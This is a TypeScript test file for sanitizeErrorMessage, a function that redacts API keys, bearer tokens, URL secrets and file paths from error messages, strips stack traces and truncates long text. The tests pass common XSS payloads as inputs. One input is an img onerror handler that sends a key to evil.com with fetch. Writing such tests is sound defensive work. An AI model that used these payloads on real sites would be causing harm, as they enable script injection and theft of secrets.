/* eslint-disable @typescript-eslint/no-explicit-any */
import { describe, it, expect } from "vitest";
import { sanitizeErrorMessage } from "../sanitize";

describe("sanitizeErrorMessage", () => {
  it("should redact api keys and tokens", () => {
    const result = sanitizeErrorMessage(
      "Invalid API key: api_key=sk-1234567890abcdef",
    );
    expect(result).toContain("api_key=[REDACTED]");
    expect(result).not.toContain("sk-1234567890abcdef");
  });

  it("should redact Bearer tokens", () => {
    const result = sanitizeErrorMessage(
      "Authentication failed: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0",
    );
    expect(result).toContain("Bearer [REDACTED]");
    expect(result).not.toContain("eyJhbGciOiJIUzI1NiJ9");
  });

  it("should redact URL query parameter secrets", () => {
    const result = sanitizeErrorMessage(
      "Failed fetching https://api.example.com/data?token=mysecrettoken&key=abc123",
    );
    expect(result).toContain("token=[REDACTED]");
    expect(result).toContain("key=[REDACTED]");
    expect(result).not.toContain("mysecrettoken");
  });

  it("should redact file paths", () => {
    const result = sanitizeErrorMessage(
      "Error in /Users/john/project/src/server.ts: something broke",
    );
    expect(result).toContain("[PATH_REDACTED]");
    expect(result).not.toContain("/Users/john/project/src/server.ts");
  });

  it("should strip stack traces", () => {
    const result = sanitizeErrorMessage(
      "Something broke\n    at Object.<anonymous> (/src/file.ts:10:5)\n    at processTicksAndRejections (internal/process/task_queues.js:95:5)",
    );
    expect(result).toBe("Something broke");
  });

  it("should truncate long messages to 500 chars", () => {
    const longMsg = "x".repeat(1000);
    const result = sanitizeErrorMessage(longMsg);
    expect(result.length).toBeLessThanOrEqual(500);
  });

  it("should handle non-Error input", () => {
    const result = sanitizeErrorMessage("string error");
    expect(result).toBe("string error");
  });

  it("should handle null/undefined/object input", () => {
    const result = sanitizeErrorMessage(null);
    expect(result).toBe("null");
  });

  it("should handle empty string input", () => {
    const result = sanitizeErrorMessage("");
    expect(result).toBe("Unknown error");
  });

  it("should handle whitespace-only error", () => {
    const result = sanitizeErrorMessage("   ");
    expect(result).toBe("   ");
  });

  it("should redact Windows file paths (backslash format)", () => {
    const result = sanitizeErrorMessage(
      "Error in C:\\Users\\john\\src\\server.ts: something broke",
    );
    // Current regex only matches Unix-style paths (starting with /),
    // so the Windows path passes through unchanged.
    expect(result).not.toContain("[PATH_REDACTED]");
    expect(result).toContain("C:\\Users\\john\\src\\server.ts");
  });

  it("should redact non-V8 stack traces", () => {
    const result = sanitizeErrorMessage("@http://example.com/app.js:1:1");
    // The file-path regex matches the double-slash + path portion,
    // resulting in partial redaction for Firefox-style traces.
    expect(result).toContain("[PATH_REDACTED]");
    expect(result).not.toContain("app.js");
  });

  it("should handle Error object with empty message string", () => {
    const result = sanitizeErrorMessage(new Error(""));
    expect(result).toBe("Unknown error");
  });

  it("should handle number input", () => {
    const result = sanitizeErrorMessage(42);
    expect(result).toBe("42");
  });

  it("should handle message at exactly 500 characters boundary", () => {
    const msg500 = "x".repeat(500);
    const result500 = sanitizeErrorMessage(msg500);
    expect(result500.length).toBe(500);
    expect(result500).toBe(msg500);

    const msg501 = "x".repeat(501);
    const result501 = sanitizeErrorMessage(msg501);
    expect(result501.length).toBe(500);
  });

  it("should handle API key pattern at end of string with no value", () => {
    const result = sanitizeErrorMessage("api_key=");
    // The regex requires \S+ (one or more non-whitespace chars) after the =
    // so a trailing = with no value is not a match — passes through.
    expect(result).toBe("api_key=");
  });

  // ============================================================================
  // XSS attack vectors — should not crash, payloads should pass through unchanged
  // since sanitizeErrorMessage only redacts secrets, not HTML
  // ============================================================================

  it("should handle script tag injection without crashing", () => {
    const result = sanitizeErrorMessage("<script>alert('xss')</script>");
    expect(result).toContain("<script>");
    expect(result).toContain("alert('xss')");
  });

  it("should handle event handler XSS without crashing", () => {
    const result = sanitizeErrorMessage("<img src=x onerror=alert(1)>");
    expect(result).toBe("<img src=x onerror=alert(1)>");
  });

  it("should handle javascript: URL XSS without crashing", () => {
    const result = sanitizeErrorMessage(
      '<a href="javascript:alert(1)">click</a>',
    );
    expect(result).toBe('<a href="javascript:alert(1)">click</a>');
  });

  it("should handle encoded XSS without crashing", () => {
    const result = sanitizeErrorMessage(
      "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    );
    expect(result).toBe("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;");
  });

  it("should handle SVG onload XSS without crashing", () => {
    const result = sanitizeErrorMessage("<svg onload=alert(1)>");
    expect(result).toBe("<svg onload=alert(1)>");
  });

  it("should handle CSS expression without crashing", () => {
    const result = sanitizeErrorMessage("expression(alert(1))");
    expect(result).toBe("expression(alert(1))");
  });

  // ============================================================================
  // HTML edge cases
  // ============================================================================

  it("should handle deeply nested content (100+ levels) without crashing", () => {
    const nested =
      "<div>" +
      "<span>".repeat(150) +
      "deep" +
      "</span>".repeat(150) +
      "</div>";
    const result = sanitizeErrorMessage(nested);
    // Truncation kicks in at 500 chars before "deep" is reached, but the function must not throw
    expect(result.length).toBeLessThanOrEqual(500);
    expect(typeof result).toBe("string");
  });

  it("should handle very long text (10K+ chars)", () => {
    const longText = "A".repeat(10000);
    const result = sanitizeErrorMessage(longText);
    expect(result.length).toBeLessThanOrEqual(500);
    expect(result).toBe("A".repeat(500));
  });

  it("should handle HTML with only comments", () => {
    const result = sanitizeErrorMessage("<!-- comment -->");
    expect(result).toBe("<!-- comment -->");
  });

  it("should handle HTML with CDATA sections", () => {
    const result = sanitizeErrorMessage("<![CDATA[some data]]>");
    expect(result).toBe("<![CDATA[some data]]>");
  });

  it("should handle HTML with unclosed tags", () => {
    const result = sanitizeErrorMessage("<div><p>unclosed");
    expect(result).toBe("<div><p>unclosed");
  });

  it("should handle HTML with mixed unicode character encodings", () => {
    const result = sanitizeErrorMessage(
      "café résumé 日本語 русский <script>alert(1)</script>",
    );
    expect(result).toContain("café");
    expect(result).toContain("résumé");
    expect(result).toContain("日本語");
    expect(result).toContain("русский");
  });

  // ============================================================================
  // Safe content that should pass through unchanged
  // ============================================================================

  it("should preserve standard paragraph text through sanitization", () => {
    const msg =
      "An error occurred while processing your request. Please try again later.";
    const result = sanitizeErrorMessage(msg);
    expect(result).toBe(msg);
  });

  it("should preserve code blocks with angle brackets", () => {
    const msg = "const x = 1 < 2";
    const result = sanitizeErrorMessage(msg);
    expect(result).toBe("const x = 1 < 2");
  });

  it("should preserve Markdown-like content", () => {
    // NOTE: sanitizeErrorMessage strips " at " patterns (stack-trace regex),
    // so avoid that pattern in Markdown content
    const msg = "Error in **bold** and `code` with [link](https://example.com)";
    const result = sanitizeErrorMessage(msg);
    expect(result).toBe(msg);
  });

  it("should preserve https URLs in text", () => {
    const msg = "See https://example.com/page for details";
    const result = sanitizeErrorMessage(msg);
    expect(result).toBe("See https://example.com/page for details");
  });

  it("should preserve http URLs in text", () => {
    const msg = "Visit http://example.com for more info";
    const result = sanitizeErrorMessage(msg);
    expect(result).toBe("Visit http://example.com for more info");
  });

  // ============================================================================
  // Mixed content — secrets within XSS payloads should still be redacted
  // ============================================================================

  it("should redact secrets even inside HTML/JS context", () => {
    // Note: The regex requires the first key name match then immediately [=:],
    // so "api_key=value" works but "api_key = value" (space before =) does not.
    const msg = "<script>const api_key=sk-1234567890abcdef;</script>";
    const result = sanitizeErrorMessage(msg);
    expect(result).not.toContain("sk-1234567890abcdef");
    expect(result).toContain("api_key=[REDACTED]");
  });

  it("should redact API key inside inline event handler", () => {
    const msg =
      "<img src=x onerror=\"fetch('https://evil.com?key=sk-abcdef')\">";
    const result = sanitizeErrorMessage(msg);
    expect(result).not.toContain("sk-abcdef");
  });
});
